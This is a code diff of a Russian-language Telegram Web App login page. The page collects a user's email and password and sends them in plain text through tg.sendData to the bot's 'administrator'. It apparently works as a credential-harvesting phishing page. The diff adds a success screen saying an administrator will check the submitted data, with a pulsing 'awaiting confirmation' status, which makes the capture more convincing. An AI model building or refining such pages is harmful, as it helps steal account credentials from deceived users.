@@ -27,6 +27,10 @@
             width: 100%;
             max-width: 420px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            min-height: 500px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
         }
         .logo {
             text-align: center;
@@ -86,9 +90,6 @@
             text-decoration: none;
             font-weight: 500;
         }
-        .forgot-link a:hover {
-            text-decoration: underline;
-        }
         .btn-primary {
             width: 100%;
             padding: 14px;
@@ -106,9 +107,6 @@
             transform: translateY(-2px);
             box-shadow: 0 8px 25px rgba(102, 126, 234, 0.35);
         }
-        .btn-primary:active {
-            transform: translateY(0);
-        }
         .btn-primary:disabled {
             opacity: 0.6;
             cursor: not-allowed;
@@ -124,9 +122,6 @@
             color: #667eea;
             font-weight: 600;
             text-decoration: none;
-        }
-        .register-link a:hover {
-            text-decoration: underline;
         }
         .message {
             margin-top: 16px;
@@ -154,6 +149,12 @@
             background: #e8f0fe;
             color: #1a56a8;
             border: 1px solid #b8d4f5;
+        }
+        .message.loading {
+            display: block;
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffc107;
         }
         .support-btn {
             width: 100%;
@@ -189,6 +190,70 @@
             font-size: 12px;
             font-weight: 500;
         }
+        /* Скрываем форму после успешной отправки */
+        .hidden {
+            display: none !important;
+        }
+        .success-screen {
+            text-align: center;
+            padding: 20px 0;
+            display: none;
+        }
+        .success-screen.show {
+            display: block;
+        }
+        .success-screen .icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+        .success-screen h2 {
+            color: #1a7a3a;
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+        .success-screen p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .success-screen .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #28a745;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+            margin-right: 8px;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .status-text {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #28a745;
+            font-weight: 500;
+            margin-top: 8px;
+        }
+        .btn-secondary {
+            width: 100%;
+            padding: 12px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 16px;
+        }
+        .btn-secondary:hover {
+            background: #5a6fd6;
+        }
     </style>
 </head>
 <body>
@@ -198,6 +263,7 @@
             <p>Войдите в свой аккаунт</p>
         </div>
 
+        <!-- ===== ФОРМА ВХОДА ===== -->
         <div id="loginForm">
             <div class="form-group">
                 <label for="email">📧 Email</label>
@@ -222,8 +288,22 @@
             </div>
         </div>
 
+        <!-- ===== ЭКРАН УСПЕШНОЙ ОТПРАВКИ ===== -->
+        <div id="successScreen" class="success-screen">
+            <div class="icon">✅</div>
+            <h2>Данные отправлены!</h2>
+            <p>Администратор проверит ваши данные<br>и свяжется с вами в ближайшее время.</p>
+            <div class="status-text">
+                <span class="status-dot"></span>
+                Ожидание подтверждения...
+            </div>
+            <button onclick="resetForm()" class="btn-secondary">🔄 Ввести заново</button>
+        </div>
+
+        <!-- ===== СООБЩЕНИЯ ===== -->
         <div id="message" class="message"></div>
 
+        <!-- ===== ТЕХПОДДЕРЖКА ===== -->
         <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
     </div>
 
@@ -231,6 +311,8 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
+        const loginForm = document.getElementById('loginForm');
+        const successScreen = document.getElementById('successScreen');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
         const submitBtn = document.getElementById('submitBtn');
@@ -243,6 +325,16 @@
             setTimeout(() => {
                 messageDiv.style.display = 'none';
             }, 5000);
+        }
+
+        function resetForm() {
+            successScreen.classList.remove('show');
+            loginForm.classList.remove('hidden');
+            emailInput.value = '';
+            passwordInput.value = '';
+            submitBtn.disabled = false;
+            submitBtn.textContent = '🔓 Войти';
+            messageDiv.style.display = 'none';
         }
 
         submitBtn.addEventListener('click', function() {
@@ -261,24 +353,34 @@
 
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ Отправка...';
+            showMessage('Отправка данных...', 'loading');
 
             const data = JSON.stringify({ email: email, password: password });
 
             try {
                 tg.sendData(data);
-                showMessage('✅ Данные отправлены администратору!', 'success');
-                emailInput.value = '';
-                passwordInput.value = '';
+                // ===== ПОСЛЕ УСПЕШНОЙ ОТПРАВКИ =====
+                submitBtn.disabled = false;
+                submitBtn.textContent = '🔓 Войти';
+                messageDiv.style.display = 'none';
+                // Показываем экран успеха
+                loginForm.classList.add('hidden');
+                successScreen.classList.add('show');
             } catch (error) {
                 showMessage('❌ Ошибка отправки. Попробуйте еще раз.', 'error');
-            } finally {
                 submitBtn.disabled = false;
                 submitBtn.textContent = '🔓 Войти';
             }
         });
 
+        // Enter для отправки
         document.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') submitBtn.click();
+            if (e.key === 'Enter') {
+                const isFormVisible = !loginForm.classList.contains('hidden');
+                if (isFormVisible) {
+                    submitBtn.click();
+                }
+            }
         });
 
         function openSupport() {
